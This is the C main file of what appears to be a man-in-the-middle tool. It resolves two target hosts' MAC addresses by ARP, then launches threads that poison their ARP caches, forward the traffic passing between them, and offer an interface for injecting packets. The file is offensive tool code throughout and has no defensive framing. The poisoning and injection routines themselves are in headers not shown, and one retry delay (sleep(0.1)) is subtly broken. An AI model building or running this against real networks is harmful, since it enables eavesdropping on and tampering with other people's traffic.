
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <libnet.h>
#include <pthread.h>

#include "usage.h"
#include "forwarding/include/forward.h"
#include "arp/include/arp.h"
#include "modularity/include/init.h"
#include "modularity/include/ec_malloc.h"
#include "modularity/include/thread_data_pass.h"
#include "inject/include/inject.h"


int main(int argc, char *argv[])
{
    if (argc < 3)
        usage(argv[0]);

    pthread_t threadForwardId, threadPoisonId, threadInjectId;

    uint32_t target1Ip, target2Ip;
    uint8_t *target1_mac = ec_malloc(6);
    uint8_t *target2_mac = ec_malloc(6);

    u_char errbuf[LIBNET_ERRBUF_SIZE]; 
    libnet_t *l = init_libnet_ethernet(errbuf);
    pcap_t *handle = init_pcap(errbuf);

    // Convert Targets ASCII-IP's to Numbers
    if (((target1Ip = libnet_name2addr4(l, argv[1], LIBNET_DONT_RESOLVE)) ==  -1) 
    || ((target2Ip = libnet_name2addr4(l, argv[2], LIBNET_DONT_RESOLVE)) ==  -1))
        fatal(libnet_geterror(l), "main.c, line 32");
    
    arp_request(target1Ip, l);
    while (arp_receive(handle, target1Ip, target1_mac) != 0) {
        sleep(0.1);   
        arp_request(target1Ip, l);
    }
    
    arp_request(target2Ip, l);
    while (arp_receive(handle, target2Ip, target2_mac) != 0) {
        sleep(0.1);
        arp_request(target2Ip, l);
    }


    struct data_pass *data_pass = ec_malloc(sizeof(struct data_pass));
    data_pass->mac1 = target1_mac;
    data_pass->mac2 = target2_mac;
    data_pass->ip1 = target1Ip;
    data_pass->ip2 = target2Ip;
    data_pass->l = l;
    data_pass->dataSentByUs1 = ec_malloc(4);
    data_pass->dataSentByUs2 = ec_malloc(4);
    *data_pass->dataSentByUs1 = 0;
    *data_pass->dataSentByUs2 = 0;
    data_pass->header1 = ec_malloc(2000);
    data_pass->header2 = ec_malloc(2000);

    // Start ARP-Poisoning on different thread 
    pthread_create(&threadPoisonId, NULL, arp_poison, (void *)data_pass);
    
    // Start ethernet forwarding on different thread 
    pthread_create(&threadForwardId, NULL, forward, (void *)data_pass);

    // Start interface for injecting packets
    pthread_create(&threadInjectId, NULL, inject, (void *)data_pass);

    pthread_join(threadForwardId, NULL);

}